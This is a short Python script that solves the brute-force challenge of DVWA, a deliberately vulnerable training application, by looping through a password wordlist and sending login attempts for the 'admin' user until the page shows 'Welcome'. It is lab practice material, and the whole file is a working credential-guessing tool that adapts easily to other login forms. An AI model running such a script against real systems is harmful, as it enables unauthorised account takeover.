#!/usr/bin/env python3
#Script to tackle the "brute force" challenge in DVWA
#Only can be used on the low or medium security setting. 
#Be sure to update security, PHPSessionID, password_file and url to match your env. 

import requests

security="low"
PHPSessionID='a0bnlpoocngmkkbcls16s0hnj0'
password_file="/tmp/fasttrack.txt"
url='http://192.168.1.163:8082/vulnerabilities/brute/'

cookies = {'security':security,
           'PHPSESSID':PHPSessionID
           }

with open(password_file,'r') as f:
    passwords = f.readlines()

#Generate a payload for each password. 
def payloads(passwords=passwords):
    payload = []
    for password in passwords:
        payload.append({'username':'admin','password':password.rstrip(),'Login':'Login'})

    return payload
    
#Test each password and return result. 
def testPasswords():
    pay = payloads()
    for payload in pay:
        r = createSession(payload)
        print(r.url)
        if "Welcome" in r.text:
          print("Sucess with :", r.url)
          quit()

#Create and return a reqeusts session object. 
def createSession(payload,security=security,url=url,cookies=cookies):
    if security == "low" or security == 'medium':
      s = requests.Session()
      r = s.get(url, cookies=cookies,params=payload)

    return r
    
testPasswords()
